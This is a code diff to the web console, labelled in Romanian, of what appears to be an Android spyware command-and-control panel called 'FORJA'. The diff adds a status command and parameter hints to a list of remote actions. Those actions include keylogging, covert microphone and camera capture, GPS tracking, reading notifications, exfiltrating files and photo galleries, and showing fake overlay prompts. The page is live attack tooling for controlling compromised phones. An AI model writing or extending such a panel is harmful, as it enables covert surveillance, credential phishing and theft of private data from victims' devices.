@@ -983,6 +983,7 @@ a{color:var(--amber);text-decoration:none}
 <div class="card" style="margin-top:12px"><h3>TRIMITE COMANDĂ</h3>
 <div id="cmdbox" style="display:none">
 <select id="act"></select>
+<div id="phint" class="sub" style="font-size:11px;margin-bottom:6px;min-height:14px"></div>
 <textarea id="params" placeholder='{"ms":30000}'></textarea>
 <button class="primary" style="width:100%" onclick="sendCmd()">Trimite</button>
 </div>
@@ -999,14 +1000,15 @@ a{color:var(--amber);text-decoration:none}
 <script>
 var KEY = sessionStorage.getItem('forjaC2Key') || '';
 var selUid = null;
-var ACTIONS = [["screenshot","Ecran (poză)"],["screen_text","Text ecran"],["keylog","Keystrokes (buffer)"],["clipboard","Clipboard"],["ui","Acțiune UI (back/home/recents/open)"],["mic","Microfon (înregistrare)"],["camera","Cameră (poză)"],["gps","Locație (acum)"],["gps_track","Traseu (N secunde)"],["device","Info dispozitiv"],["apps","Aplicații instalate"],["foreground","Aplicație în prim-plan"],["recent","Aplicații recente"],["usage","Utilizare 24h"],["notifications","Notificări"],["exfil_file","Exfiltrează fișier (uri)"],["exfil_gallery","Exfiltrează galerie (limit)"],["overlay","Suprapunere (prompt fals)"]];
+var ACTIONS = [["status","Status / diagnostic"],["screenshot","Ecran (poză)"],["screen_text","Text ecran"],["keylog","Keystrokes (buffer)"],["clipboard","Clipboard"],["ui","Acțiune UI (back/home/recents/open)"],["mic","Microfon (înregistrare)"],["camera","Cameră (poză)"],["gps","Locație (acum)"],["gps_track","Traseu (N secunde)"],["device","Info dispozitiv"],["apps","Aplicații instalate"],["foreground","Aplicație în prim-plan"],["recent","Aplicații recente"],["usage","Utilizare 24h"],["notifications","Notificări"],["exfil_file","Exfiltrează fișier (uri)"],["exfil_gallery","Exfiltrează galerie (limit)"],["overlay","Suprapunere (prompt fals)"]];
+var PARAMS_HINT = {status:"",screenshot:"",screen_text:"",keylog:"",clipboard:"",ui:'{"action":"back"}  (back|home|recents|open)',mic:'{"ms":10000}  (500–120000)',camera:"",gps:"",gps_track:'{"ms":30000,"everyMs":5000}',device:"",apps:"",foreground:"",recent:"",usage:"",notifications:"",exfil_file:'{"uri":"content://media/external/images/media/123"}',exfil_gallery:'{"limit":5}',overlay:'{"title":"FORJA","body":"Text mesaj"}'};
 function esc(s){ return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/'/g,'&#39;'); }
 function needKey(){ document.getElementById('login').style.display='flex'; document.getElementById('key').focus(); }
 function saveKey(){ var v=document.getElementById('key').value.trim(); if(!v) return; KEY=v; sessionStorage.setItem('forjaC2Key',v); document.getElementById('login').style.display='none'; loadDevices(); }
 function logout(){ sessionStorage.removeItem('forjaC2Key'); location.reload(); }
 function api(p, opt){ opt=opt||{}; opt.headers=Object.assign({'X-Admin':KEY,'Content-Type':'application/json'}, opt.headers||{}); return fetch(p,opt).then(function(r){ if(r.status===403){ needKey(); throw new Error('cheie'); } return r.json(); }); }
 function ago(ts){ var s=Math.max(0,Math.floor((Date.now()-ts)/1000)); if(s<60) return s+'s'; if(s<3600) return Math.floor(s/60)+'m'; if(s<86400) return Math.floor(s/3600)+'h'; return Math.floor(s/86400)+'d'; }
-function buildActions(){ var sel=document.getElementById('act'); sel.innerHTML=''; ACTIONS.forEach(function(a){ var o=document.createElement('option'); o.value=a[0]; o.textContent=a[0]+' — '+a[1]; sel.appendChild(o); }); }
+function buildActions(){ var sel=document.getElementById('act'); sel.innerHTML=''; ACTIONS.forEach(function(a){ var o=document.createElement('option'); o.value=a[0]; o.textContent=a[0]+' — '+a[1]; sel.appendChild(o); }); var h=document.getElementById('phint'); if(h){ sel.onchange=function(){ h.textContent=PARAMS_HINT[sel.value]||''; }; h.textContent=PARAMS_HINT[sel.value]||''; } }
 function loadDevices(){ if(!KEY) return;
   api('/admin/api/c2/devices').then(function(d){
     document.getElementById('dot').className='dot on';
